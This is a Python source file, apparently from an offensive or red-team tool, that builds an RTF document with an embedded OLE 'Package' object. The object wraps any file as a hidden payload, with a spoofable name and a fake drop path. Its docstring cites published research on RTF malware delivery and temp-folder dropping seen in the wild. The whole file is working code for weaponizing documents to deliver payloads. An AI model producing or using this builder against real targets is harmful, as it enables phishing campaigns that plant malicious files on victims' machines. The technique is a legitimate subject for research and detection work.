import os
import struct
import binascii

class Package:
    """
    Packager spec based on:
    https://phishme.com/rtf-malware-delivery/

    Dropping method by Haifei Li:
    https://securingtomorrow.mcafee.com/mcafee-labs/dropping-files-temp-folder-raises-security-concerns/
    Found being used itw by @MalwareParty:
    https://twitter.com/MalwareParty/status/943861021260861440
    """
    def __init__(self, filename, fakepath='C:\\drivers', fakename=None):
        if fakename:
            self.filename = fakename
        else:
            self.filename = os.path.basename(filename)
        path = '{}\\{}'.format(fakepath, self.filename)

        self.orgpath = path
        self.datapath = path

        with open(filename,'rb') as f:
            self.data = f.read()

        self.OBJ_HEAD = r"{\object\objemb\objw1\objh1{\*\objclass Package}{\*\objdata "
        self.OBJ_TAIL = r"0105000000000000}}"

    def get_object_header(self):
        OLEVersion = '01050000'
        FormatID = '02000000'
        ClassName = 'Package'
        szClassName = binascii.hexlify(struct.pack("<I", len(ClassName) + 1)).decode()
        szPackageData = binascii.hexlify(struct.pack("<I", int(len(self.get_package_data())/2))).decode()

        return ''.join([
            OLEVersion,
            FormatID,
            szClassName,
            binascii.hexlify(ClassName.encode()).decode() + '00',
            '00000000',
            '00000000',
            szPackageData,
        ])

    def get_package_data(self):
        StreamHeader = '0200'
        Label = binascii.hexlify(self.filename.encode()).decode() + '00'
        OrgPath = binascii.hexlify(self.orgpath.encode()).decode() + '00'
        UType = '00000300'
        DataPath = binascii.hexlify(self.datapath.encode()).decode() + '00'
        DataPathLen = binascii.hexlify(struct.pack("<I", len(self.datapath)+1)).decode()
        DataLen = binascii.hexlify(struct.pack("<I", len(self.data))).decode()
        Data = binascii.hexlify(self.data).decode()
        OrgPathWLen = binascii.hexlify(struct.pack("<I", len(self.datapath))).decode()
        OrgPathW = binascii.hexlify(self.datapath.encode('utf-16le')).decode()
        LabelLen = binascii.hexlify(struct.pack("<I", len(self.filename))).decode()
        LabelW = binascii.hexlify(self.filename.encode('utf-16le')).decode()
        DefPathWLen = binascii.hexlify(struct.pack("<I", len(self.orgpath))).decode()
        DefPathW = binascii.hexlify(self.orgpath.encode('utf-16le')).decode()

        return ''.join([
            StreamHeader,
            Label,
            OrgPath,
            UType,
            DataPathLen,
            DataPath,
            DataLen,
            Data,
            OrgPathWLen,
            OrgPathW,
            LabelLen,
            LabelW,
            DefPathWLen,
            DefPathW,
        ])

    def build_package(self):
        return self.OBJ_HEAD + self.get_object_header() + self.get_package_data() + self.OBJ_TAIL
